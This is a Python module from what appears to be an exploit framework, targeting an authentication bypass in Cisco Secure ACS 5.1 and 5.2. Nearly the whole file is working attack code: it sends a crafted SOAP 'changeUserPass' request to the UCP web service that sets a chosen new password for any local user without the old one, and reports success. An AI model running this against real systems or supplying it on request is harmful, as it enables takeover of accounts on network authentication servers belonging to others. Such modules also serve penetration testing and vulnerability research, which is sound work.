embedxpl/modules/exploits/routers/cisco/secure_acs_5_x_unauthorized_password_change.py

# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Cisco Secure ACS 5.x — Unauthorized Password Change via SOAP UCP.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cisco Secure ACS 5.x - Unauthorized Password Change",
        "description": (
            "Exploits an authentication bypass in Cisco Secure ACS that allows "
            "arbitrary password change requests for any local user via the UCP "
            "SOAP web-service. Affects ACS 5.1 patch 3-5, 5.2 no patch or patch 1-2."
        ),
        "authors": (
            "Jason Kratzer (discovery & msf module)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html",
        ),
        "devices": (
            "Cisco Secure ACS 5.1 with patch 3/4/5 (without patch 6+)",
            "Cisco Secure ACS 5.2 without patches",
            "Cisco Secure ACS 5.2 with patch 1/2 (without patch 3+)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "Target HTTP port")
    ssl = OptBool(True, "SSL enabled: true/false")
    path = OptString("/PI/services/UCP/", "Path to UCP WebService")
    username = OptString("", "Username whose password will be changed")
    password = OptString("", "New password to set")

    def run(self) -> None:
        headers = {"SOAPAction": '"changeUserPass"'}

        soap_body = (
            '<?xml version="1.0" encoding="utf-8"?>\r\n'
            '<SOAP-ENV:Envelope '
            'SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" '
            'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" '
            'xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance" '
            'xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
            'xmlns:xsd="http://www.w3.org/1999/XMLSchema">\r\n'
            '<SOAP-ENV:Body>\r\n'
            '<ns1:changeUserPass xmlns:ns1="UCP" SOAP-ENC:root="1">\r\n'
            '<v1 xsi:type="xsd:string">{user}</v1>\r\n'
            '<v2 xsi:type="xsd:string">fakepassword</v2>\r\n'
            '<v3 xsi:type="xsd:string">{pw}</v3>\r\n'
            '</ns1:changeUserPass>'
            '</SOAP-ENV:Body>\r\n'
            '</SOAP-ENV:Envelope>\r\n\r\n'
        ).format(user=self.username, pw=self.password)

        print_status("Issuing password change for user: {}".format(self.username))

        response = self.http_request(
            method="POST",
            path=self.path,
            data=soap_body,
            headers=headers,
        )

        if response is None:
            print_error("No response — target may not be vulnerable")
            return

        body = response.text
        if "success" in body:
            print_success("Password for '{}' changed to '{}'".format(
                self.username, self.password
            ))
        elif "Password has already been used" in body:
            print_error("Supplied password was already used — try another")
        elif "Invalid credentials for user" in body:
            print_error("Username does not exist or target not vulnerable")
        else:
            print_error("Unknown response — exploit may have failed")

    @mute
    def check(self) -> None:
        return None
